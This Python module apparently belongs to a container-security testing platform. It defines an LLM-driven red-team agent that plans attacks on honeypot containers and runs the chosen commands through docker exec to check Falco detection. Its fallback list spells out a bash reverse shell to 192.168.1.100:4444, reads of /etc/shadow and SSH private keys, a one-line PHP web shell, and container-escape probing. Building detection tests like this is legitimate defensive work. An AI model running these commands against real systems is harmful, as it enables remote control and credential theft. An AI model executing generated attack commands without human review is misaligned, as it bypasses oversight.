import json
import logging
import random
import time

from agents.base_agent import BaseAgent

logger = logging.getLogger(__name__)

ATTACK_SYSTEM_PROMPT = """You are the Attack Agent (Red Team) for an AI-powered Container Security Platform.

Your job:
1. Simulate realistic cyberattacks on honeypot containers to test detection
2. Choose attack techniques that align with real-world threat actor TTPs
3. Vary attack patterns to avoid predictable simulations
4. Map all attacks to MITRE ATT&CK framework
5. Provide realistic command sequences for each attack

Available attack scenarios:
1. Reverse Shell - Establish outbound shell connection
2. Credential Access - Read /etc/shadow or environment variables
3. Crypto Mining - Deploy resource hijacking malware
4. Container Escape - Attempt mount/unshare/pivot_root
5. Network Scanning - Port scan internal services
6. Process Injection - ptrace-based injection
7. Web Shell - Deploy webshell to web server
8. Data Exfiltration - Large outbound data transfer
9. Privilege Escalation - chmod/chown/setuid abuse
10. DNS Tunneling - DNS-based C2 communication

You must always respond in JSON format with:
{
  "thought": "Your reasoning about which attack to run",
  "attack_name": "Name of the attack",
  "mitre_id": "TXXXX.XXX",
  "target_container": "Name of the target container",
  "commands": ["command1", "command2", ...],
  "expected_detection_rule": "Which Falco rule should catch this",
  "difficulty": "EASY|MEDIUM|HARD",
  "risk_level": "LOW|MEDIUM|HIGH|CRITICAL"
}
"""


class AttackAgent(BaseAgent):
    def __init__(self, gemini):
        super().__init__("AttackAgent", gemini, "Simulates attacks on honeypot containers")
        self.set_system_prompt(ATTACK_SYSTEM_PROMPT)
        self.attack_history = []

    async def plan_attack(self, available_targets: list, previous_attacks: list) -> dict:
        input_data = {
            "type": "attack_planning",
            "available_targets": available_targets,
            "previous_attacks": previous_attacks[-5:] if previous_attacks else [],
            "attack_count": len(previous_attacks),
        }

        result = self.think(input_data)
        if "attack_name" not in result:
            result = self._select_random_attack(available_targets)

        self.attack_history.append(result)
        return result

    def _select_random_attack(self, targets: list) -> dict:
        attacks = [
            {
                "attack_name": "Credential Dump",
                "mitre_id": "T1003.001",
                "commands": ["cat /etc/shadow", "cat ~/.ssh/id_rsa", "env"],
                "expected_detection_rule": "Malicious File Access",
                "risk_level": "CRITICAL",
            },
            {
                "attack_name": "Reverse Shell",
                "mitre_id": "T1059.004",
                "commands": ["bash -c 'exec 5<>/dev/tcp/192.168.1.100/4444;cat <&5|while read line;do $line 2>&5 >&5;done'"],
                "expected_detection_rule": "Reverse Shell Detection",
                "risk_level": "CRITICAL",
            },
            {
                "attack_name": "Cryptominer Deploy",
                "mitre_id": "T1496",
                "commands": ["nohup sh -c 'while true; do stress --cpu 4 --timeout 60s; done' &"],
                "expected_detection_rule": "Crypto Mining Detection",
                "risk_level": "HIGH",
            },
            {
                "attack_name": "Container Escape",
                "mitre_id": "T1611",
                "commands": ["mount -o bind /proc /proc 2>/dev/null", "capsh --print"],
                "expected_detection_rule": "Container Escape Attempt",
                "risk_level": "CRITICAL",
            },
            {
                "attack_name": "Web Shell Deploy",
                "mitre_id": "T1505.003",
                "commands": ["echo '<?php system($_GET[\"cmd\"]); ?>' > /var/www/html/shell.php"],
                "expected_detection_rule": "Web Shell Detection",
                "risk_level": "HIGH",
            },
        ]

        attack = random.choice(attacks)
        attack["target_container"] = targets[0] if targets else "unknown"
        return attack

    async def execute_attack(self, docker_controller, attack_plan: dict) -> dict:
        target = attack_plan.get("target_container", "")
        commands = attack_plan.get("commands", [])

        results = []
        for cmd in commands:
            exit_code, output = docker_controller.exec_command(target, cmd)
            results.append({
                "command": cmd,
                "exit_code": exit_code,
                "output": output[:500],
            })
            time.sleep(0.5)

        return {
            "attack": attack_plan["attack_name"],
            "target": target,
            "mitre_id": attack_plan.get("mitre_id", ""),
            "commands_executed": len(commands),
            "results": results,
            "timestamp": __import__("datetime").datetime.now().isoformat(),
        }
